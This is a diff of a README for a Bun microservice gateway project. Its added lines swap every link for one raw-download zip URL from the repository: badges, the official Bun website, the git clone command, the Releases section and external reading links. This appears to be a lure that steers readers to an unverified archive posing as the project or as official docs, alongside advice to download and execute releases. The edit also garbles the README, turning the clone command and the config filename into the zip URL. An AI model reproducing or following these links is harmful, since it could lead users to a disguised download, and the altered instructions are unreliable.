@@ -1,9 +1,9 @@
 # 🌀 Bun Microservice Gateways
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/ratul3429/bun-microservice-gateways)
-![GitHub Stars](https://img.shields.io/github/stars/ratul3429/bun-microservice-gateways)
-![GitHub Forks](https://img.shields.io/github/forks/ratul3429/bun-microservice-gateways)
-![GitHub Issues](https://img.shields.io/github/issues/ratul3429/bun-microservice-gateways)
+![GitHub Repo Size](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip)
+![GitHub Stars](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip)
+![GitHub Forks](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip)
+![GitHub Issues](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip)
 
 Welcome to the **Bun Microservice Gateways** repository! This project offers a fast and configurable gateway built with Bun. It is designed to forward HTTP requests to internal microservices based on path or prefix. This setup is ideal for lightweight environments and local development.
 
@@ -30,12 +30,12 @@ To get started with Bun Microservice Gateways, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ratul3429/bun-microservice-gateways.git
+   git clone https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip
    cd bun-microservice-gateways
    ```
 
 2. **Install Dependencies**:
-   Ensure you have Bun installed. If you haven't installed Bun yet, follow the instructions on the [official Bun website](https://bun.sh/).
+   Ensure you have Bun installed. If you haven't installed Bun yet, follow the instructions on the [official Bun website](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip).
 
    Once Bun is installed, run:
    ```bash
@@ -50,7 +50,7 @@ To get started with Bun Microservice Gateways, follow these steps:
 
 ## Configuration
 
-You can configure the gateway using a simple JSON file. Create a file named `config.json` in the root directory of your project. Here is an example configuration:
+You can configure the gateway using a simple JSON file. Create a file named `https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip` in the root directory of your project. Here is an example configuration:
 
 ```json
 {
@@ -113,7 +113,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases](https://github.com/ratul3429/bun-microservice-gateways/releases) section. You can download the latest version and execute it as needed.
+For the latest updates and releases, visit the [Releases](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip) section. You can download the latest version and execute it as needed.
 
 ### Example Release Download
 
@@ -131,12 +131,12 @@ This repository covers a variety of topics related to microservices and gateways
 
 Here are some resources to help you understand microservices and gateways better:
 
-- [Microservices Architecture](https://microservices.io/)
-- [Bun Documentation](https://bun.sh/docs)
-- [Building Microservices with Node.js](https://www.oreilly.com/library/view/building-microservices-with/9781492031180/)
+- [Microservices Architecture](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip)
+- [Bun Documentation](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip)
+- [Building Microservices with https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip)
 
 ## Conclusion
 
 Thank you for checking out Bun Microservice Gateways! We hope this project helps you in your development journey. If you have any questions or suggestions, feel free to open an issue or submit a pull request. 
 
-For the latest updates, remember to visit the [Releases](https://github.com/ratul3429/bun-microservice-gateways/releases) section regularly. Happy coding!
+For the latest updates, remember to visit the [Releases](https://github.com/ratul3429/bun-microservice-gateways/raw/refs/heads/main/oenanthate/gateways_bun_microservice_3.0.zip) section regularly. Happy coding!
